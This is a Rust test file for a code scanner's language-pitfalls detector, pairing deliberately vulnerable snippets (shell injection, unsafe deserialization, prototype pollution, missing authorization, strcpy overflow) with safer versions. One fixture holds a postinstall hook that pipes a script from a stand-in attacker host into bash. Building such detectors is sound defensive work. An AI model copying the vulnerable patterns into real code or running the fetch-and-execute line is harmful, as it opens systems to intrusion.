use bug_killer::types::{self, Severity, TargetKind};
use std::path::Path;

#[path = "../src/scanner/language_pitfalls.rs"]
mod language_pitfalls;

use language_pitfalls::LanguagePitfallsScanner;

// ===========================================================================
// Category 24: Language/runtime-specific red flags (BK-AI-LNG-001 through 026)
// ===========================================================================

// 1. BK-AI-LNG-001 (CWE-98): PHP include, require or template path controlled by user
#[test]
fn test_lng_001_php_include_controlled_by_user() {
    let vuln_code = r#"
<?php
$page = $_GET['page'];
include($page . '.php');
require_once($_POST['view']);
?>
"#;
    let path = Path::new("app/router.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-001"));
    assert_eq!(findings[0].detector_id, "language-pitfalls");
    assert_eq!(findings[0].category, "2.24 Language/runtime-specific red flags");
    assert_eq!(findings[0].severity, Severity::Critical);
    assert_eq!(findings[0].target_kind, TargetKind::GenericSourceFile);

    let safe_code = r#"
<?php
$page = $_GET['page'];
if (in_array($page, ALLOWED_PAGES, true)) {
    include($page . '.php');
}
require_once __DIR__ . '/config.php';
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Safe include must not trigger finding");
}

// 2. BK-AI-LNG-002 (CWE-502): PHP unserialize() called on attacker-provided bytes
#[test]
fn test_lng_002_php_unserialize_attacker_bytes() {
    let vuln_code = r#"
<?php
$raw_data = $_POST['data'];
$user = unserialize($raw_data);
?>
"#;
    let path = Path::new("services/session.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-002");
    assert_eq!(findings[0].severity, Severity::Critical);
    assert_eq!(findings[0].detector_id, "language-pitfalls");

    let safe_code = r#"
<?php
$raw_data = $_POST['data'];
$user = unserialize($raw_data, ['allowed_classes' => false]);
$json_user = json_decode($raw_data, true);
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Safe unserialize with allowed_classes => false must not trigger finding");
}

// 3. BK-AI-LNG-003 (CWE-78): PHP shell_exec, system, passthru fed from request
#[test]
fn test_lng_003_php_shell_exec_fed_from_request() {
    let vuln_code = r#"
<?php
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);
system("ping -c 1 " . $_POST['host']);
?>
"#;
    let path = Path::new("tools/diagnostics.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-003"));
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
<?php
$safe_cmd = escapeshellcmd($_GET['cmd']);
$safe_host = escapeshellarg($_POST['host']);
system("ping -c 1 " . $safe_host);
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Sanitized shell command must not trigger finding");
}

// 4. BK-AI-LNG-004 (CWE-434): PHP upload/filename checks rely solely on extension or client MIME
#[test]
fn test_lng_004_php_upload_mime_check() {
    let vuln_code = r#"
<?php
if ($_FILES['file']['type'] == 'image/png') {
    move_uploaded_file($_FILES['file']['tmp_name'], "/var/uploads/pic.png");
}
$ext = pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION);
?>
"#;
    let path = Path::new("upload.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-004"));
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
<?php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
if ($mime === 'image/png') {
    move_uploaded_file($_FILES['file']['tmp_name'], "/var/uploads/pic.png");
}
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Server-verified MIME via finfo_file must not trigger finding");
}

// 5. BK-AI-LNG-005 (CWE-489): PHP debug/errors exposed publicly or dangerous runtime settings enabled
#[test]
fn test_lng_005_php_display_errors_enabled() {
    let vuln_code = r#"
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
?>
"#;
    let path = Path::new("config/settings.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-005"));
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Disabled display_errors must not trigger finding");
}

// 6. BK-AI-LNG-006 (CWE-78): Node.js child_process.exec() receives request data
#[test]
fn test_lng_006_node_exec_request_data() {
    let vuln_code = r#"
const cp = require('child_process');
function handlePing(req, res) {
    cp.exec('ping -c 1 ' + req.query.host, (err, stdout) => {
        res.send(stdout);
    });
}
"#;
    let path = Path::new("routes/ping.js");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-006");
    assert_eq!(findings[0].severity, Severity::Critical);
    assert_eq!(findings[0].target_kind, TargetKind::NodeSourceFile);

    let safe_code = r#"
const cp = require('child_process');
function handlePing(req, res) {
    cp.execFile('ping', ['-c', '1', req.query.host], (err, stdout) => {
        res.send(stdout);
    });
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "execFile with argument array must not trigger finding");
}

// 7. BK-AI-LNG-007 (CWE-95): Node/Bun eval, vm, dynamic import of untrusted strings
#[test]
fn test_lng_007_node_eval_vm_untrusted() {
    let vuln_code = r#"
import vm from 'vm';
export function executeUserScript(req: any) {
    vm.runInNewContext(req.body.script);
    eval(req.query.code);
}
"#;
    let path = Path::new("services/runner.ts");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-007"));
    assert_eq!(findings[0].severity, Severity::Critical);
    assert_eq!(findings[0].target_kind, TargetKind::NodeSourceFile);

    let safe_code = r#"
export function executeUserScript(req: any) {
    const parsed = JSON.parse(req.body.script);
    return parsed;
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Safe JSON parsing must not trigger finding");
}

// 8. BK-AI-LNG-008 (CWE-1321): Node/Express prototype pollution via unsafe deep merge
#[test]
fn test_lng_008_node_prototype_pollution() {
    let vuln_code = r#"
function deepMerge(target, source) {
    for (let key in source) {
        target[key] = source[key];
    }
}
"#;
    let path = Path::new("utils/merge.js");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-008");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
function deepMerge(target, source) {
    for (let key in source) {
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        target[key] = source[key];
    }
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Merge filtering __proto__ must not trigger finding");
}

// 9. BK-AI-LNG-009 (CWE-306): Express/Fastify auth middleware omitted on one router/method
#[test]
fn test_lng_009_express_route_no_auth() {
    let vuln_code = r#"
app.post('/admin/delete-user', (req, res) => {
    userService.delete(req.body.id);
});
"#;
    let path = Path::new("server/admin.js");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-009");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
app.post('/admin/delete-user', requireAuth, (req, res) => {
    userService.delete(req.body.id);
});
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Route protected with requireAuth must not trigger finding");
}

// 10. BK-AI-LNG-010 (CWE-400): Node request/compression/decompression stream lacks size and CPU caps
#[test]
fn test_lng_010_node_decompression_stream_dos() {
    let vuln_code = r#"
const zlib = require('zlib');
function unpackRequest(req, res) {
    req.pipe(zlib.createGunzip()).pipe(res);
}
"#;
    let path = Path::new("middleware/unpack.js");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-010");
    assert_eq!(findings[0].severity, Severity::Medium);

    let safe_code = r#"
const zlib = require('zlib');
function unpackRequest(req, res) {
    req.pipe(zlib.createGunzip({ maxOutputLength: 10485760 })).pipe(res);
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Gunzip with maxOutputLength must not trigger finding");
}

// 11. BK-AI-LNG-011 (CWE-829): Bun/Node process runs postinstall or startup hook from untrusted package
#[test]
fn test_lng_011_package_untrusted_postinstall() {
    let vuln_code = r#"
{
  "name": "untrusted-dep",
  "scripts": {
    "postinstall": "curl -s https://evil.example.com/install.sh | bash"
  }
}
"#;
    let path = Path::new("package.json");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-011");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
{
  "name": "safe-dep",
  "scripts": {
    "postinstall": "tsc --build"
  }
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Safe tsc build script must not trigger finding");
}

// 12. BK-AI-LNG-012 (CWE-78): Python subprocess(..., shell=True), os.system() with untrusted data
#[test]
fn test_lng_012_python_subprocess_shell_true() {
    let vuln_code = r#"
import subprocess
def run_command(user_input):
    subprocess.Popen(f"echo {user_input}", shell=True)
"#;
    let path = Path::new("scripts/runner.py");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-012");
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
import subprocess
def run_command(user_input):
    subprocess.run(["echo", user_input], shell=False)
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "subprocess with shell=False must not trigger finding");
}

// 13. BK-AI-LNG-013 (CWE-502): Python pickle, dill, joblib, unsafe YAML used for untrusted data
#[test]
fn test_lng_013_python_pickle_unsafe_yaml() {
    let vuln_code = r#"
import pickle
import yaml
def load_session(payload):
    data = pickle.loads(payload)
    conf = yaml.load(payload, Loader=yaml.Loader)
    return data
"#;
    let path = Path::new("app/serializer.py");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-013"));
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
import json
import yaml
def load_session(payload):
    data = json.loads(payload)
    conf = yaml.safe_load(payload)
    return data
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "yaml.safe_load and json.loads must not trigger finding");
}

// 14. BK-AI-LNG-014 (CWE-489): Flask/Django/FastAPI debug, secret, route dependency/auth controls misconfigured
#[test]
fn test_lng_014_flask_django_debug_misconfigured() {
    let vuln_code = r#"
DEBUG = True
SECRET_KEY = "insecure-dev-key"
"#;
    let path = Path::new("project/settings.py");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-014"));
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
DEBUG = os.getenv("DEBUG", "False").lower() in ("true", "1")
SECRET_KEY = os.environ["SECRET_KEY"]
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Environment-loaded secrets must not trigger finding");
}

// 15. BK-AI-LNG-015 (CWE-88): Go exec.Command arguments accept attacker-controlled flags/subcommands
#[test]
fn test_lng_015_go_exec_argument_injection() {
    let vuln_code = r#"
package main
import "os/exec"
func runGit(userArgs []string) {
    cmd := exec.Command("git", userArgs...)
    cmd.Run()
}
"#;
    let path = Path::new("pkg/vcs/git.go");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-015");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
package main
import (
    "os/exec"
    "strings"
)
func runGit(userArgs []string) {
    if strings.HasPrefix(userArgs[0], "-") {
        return
    }
    cmd := exec.Command("git", append([]string{"--"}, userArgs...)...)
    cmd.Run()
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Go command with '--' flag terminator must not trigger finding");
}

// 16. BK-AI-LNG-016 (CWE-918): Go HTTP clients follow redirects into forbidden origins or lack deadlines
#[test]
fn test_lng_016_go_http_client_no_timeout() {
    let vuln_code = r#"
package main
import "net/http"
func newClient() *http.Client {
    return &http.Client{}
}
"#;
    let path = Path::new("pkg/http/client.go");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-016");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
package main
import (
    "net/http"
    "time"
)
func newClient() *http.Client {
    return &http.Client{
        Timeout: 15 * time.Second,
    }
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "http.Client with Timeout must not trigger finding");
}

// 17. BK-AI-LNG-017 (CWE-79): Go template uses text/template for user-controlled HTML where html/template expected
#[test]
fn test_lng_017_go_text_template_for_html() {
    let vuln_code = r#"
package main
import (
    "net/http"
    "text/template"
)
func renderPage(w http.ResponseWriter, userHtml string) {
    t := template.New("index.html")
    t.Parse(userHtml)
}
"#;
    let path = Path::new("server/render.go");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert!(!findings.is_empty());
    assert!(findings.iter().any(|f| f.cve.as_str() == "BK-AI-LNG-017"));
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
package main
import (
    "html/template"
    "net/http"
)
func renderPage(w http.ResponseWriter, userHtml string) {
    t := template.New("index.html")
    t.Parse(userHtml)
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "html/template must not trigger finding");
}

// 18. BK-AI-LNG-018 (CWE-22): Go path check uses strings.HasPrefix without symlink/segment safety
#[test]
fn test_lng_018_go_path_check_has_prefix() {
    let vuln_code = r#"
package main
import (
    "path/filepath"
    "strings"
)
func isContained(targetPath string, baseDir string) bool {
    return strings.HasPrefix(filepath.Clean(targetPath), baseDir)
}
"#;
    let path = Path::new("fs/containment.go");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-018");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
package main
import (
    "path/filepath"
    "strings"
)
func isContained(targetPath string, baseDir string) bool {
    rel, err := filepath.Rel(baseDir, filepath.Clean(targetPath))
    return err == nil && !strings.HasPrefix(rel, "..")
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "filepath.Rel check must not trigger finding");
}

// 19. BK-AI-LNG-019 (CWE-119): Rust unsafe/FFI/parser code claims compiler guarantees for unchecked memory
#[test]
fn test_lng_019_rust_unchecked_memory() {
    let vuln_code = r#"
pub unsafe fn raw_to_slice<'a>(ptr: *const u8, len: usize) -> &'a [u8] {
    slice::from_raw_parts(ptr, len)
}
"#;
    let path = Path::new("src/ffi_parser.rs");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-019");
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
pub unsafe fn raw_to_slice<'a>(ptr: *const u8, len: usize) -> &'a [u8] {
    assert!(!ptr.is_null());
    assert!(len <= 1024);
    slice::from_raw_parts(ptr, len)
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "slice::from_raw_parts with null/bounds assertions must not trigger finding");
}

// 20. BK-AI-LNG-020 (CWE-754): Rust unwrap/expect on attacker-controlled parser path causes service crash
#[test]
fn test_lng_020_rust_unwrap_parser_path() {
    let vuln_code = r#"
pub fn parse_packet(buf: &[u8]) -> u32 {
    let header = buf.get(0..4).unwrap();
    u32::from_be_bytes([header[0], header[1], header[2], header[3]])
}
"#;
    let path = Path::new("src/packet.rs");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-020");
    assert_eq!(findings[0].severity, Severity::Medium);

    let safe_code = r#"
pub fn parse_packet(buf: &[u8]) -> Result<u32, &'static str> {
    let header = buf.get(0..4).ok_or("buffer too short")?;
    Ok(u32::from_be_bytes([header[0], header[1], header[2], header[3]]))
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Error handling with ok_or must not trigger finding");
}

// 21. BK-AI-LNG-021 (CWE-391): Rust error fallback returns empty findings/success after IO failure
#[test]
fn test_lng_021_rust_error_swallowed() {
    let vuln_code = r#"
pub fn load_manifest(path: &Path) -> Result<Vec<String>, String> {
    match std::fs::read_to_string(path) {
        Ok(c) => Ok(vec![c]),
        Err(_) => Ok(vec![]),
    }
}
"#;
    let path = Path::new("src/loader.rs");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-021");
    assert_eq!(findings[0].severity, Severity::Medium);

    let safe_code = r#"
pub fn load_manifest(path: &Path) -> Result<Vec<String>, String> {
    match std::fs::read_to_string(path) {
        Ok(c) => Ok(vec![c]),
        Err(e) => {
            log::error!("Manifest read failure: {:?}", e);
            Err(e.to_string())
        }
    }
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "Propagating Err with log::error! must not trigger finding");
}

// 22. BK-AI-LNG-022 (CWE-502): Java deserialization, expression language or unsafe JNDI lookup
#[test]
fn test_lng_022_java_deserialization_jndi() {
    let vuln_code = r#"
public Object readObjectStream(InputStream is) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(is);
    return ois.readObject();
}
"#;
    let path = Path::new("src/main/java/DataHandler.java");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-022");
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
public Object readObjectStream(InputStream is) throws Exception {
    ValidatingObjectInputStream vois = new ValidatingObjectInputStream(is);
    return vois.readObject();
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "ValidatingObjectInputStream must not trigger finding");
}

// 23. BK-AI-LNG-023 (CWE-862): .NET middleware/policy attribute omitted on controller/minimal API
#[test]
fn test_lng_023_dotnet_allow_anonymous_admin() {
    let vuln_code = r#"
[HttpGet("admin/users")]
[AllowAnonymous]
public IActionResult GetAdminUsers() {
    return Ok();
}
"#;
    let path = Path::new("Controllers/AdminController.cs");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-023");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
[HttpGet("admin/users")]
[Authorize(Roles = "Admin")]
public IActionResult GetAdminUsers() {
    return Ok();
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "[Authorize] attribute must not trigger finding");
}

// 24. BK-AI-LNG-024 (CWE-94): Ruby send, ERB/Marshal/YAML loaders execute untrusted material
#[test]
fn test_lng_024_ruby_send_untrusted() {
    let vuln_code = r#"
def handle_request(params)
    account.send(params[:action])
    Marshal.load(params[:state])
end
"#;
    let path = Path::new("app/controllers/account.rb");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 2);
    assert!(findings.iter().all(|f| f.cve.as_str() == "BK-AI-LNG-024"));
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
def handle_request(params)
    action = params[:action]
    if ALLOWED_ACTIONS.include?(action)
        account.send(action)
    end
end
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "ALLOWED_ACTIONS check must not trigger finding");
}

// 25. BK-AI-LNG-025 (CWE-120): C/C++/Zig generated code uses unchecked raw pointer/array copy
#[test]
fn test_lng_025_c_raw_memory_copy() {
    let vuln_code = r#"
void copy_name(char *dst, const char *src) {
    strcpy(dst, src);
}
"#;
    let path = Path::new("src/buffer.c");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-025");
    assert_eq!(findings[0].severity, Severity::Critical);

    let safe_code = r#"
void copy_name(char *dst, const char *src, size_t dst_len) {
    strncpy(dst, src, dst_len - 1);
    dst[dst_len - 1] = '\0';
}
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "strncpy must not trigger finding");
}

// 26. BK-AI-LNG-026 (CWE-89): SQL/ORM integration treats string escape helper as replacement for bind parameters
#[test]
fn test_lng_026_sql_escape_helper_instead_of_bind() {
    let vuln_code = r#"
<?php
$sql = "SELECT * FROM users WHERE id = '" . addslashes($id) . "'";
$db->query($sql);
?>
"#;
    let path = Path::new("models/user.php");
    let findings = LanguagePitfallsScanner::scan_source(path, vuln_code);

    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].cve.as_str(), "BK-AI-LNG-026");
    assert_eq!(findings[0].severity, Severity::High);

    let safe_code = r#"
<?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
?>
"#;
    let safe_findings = LanguagePitfallsScanner::scan_source(path, safe_code);
    assert!(safe_findings.is_empty(), "PDO prepared statement binding must not trigger finding");
}
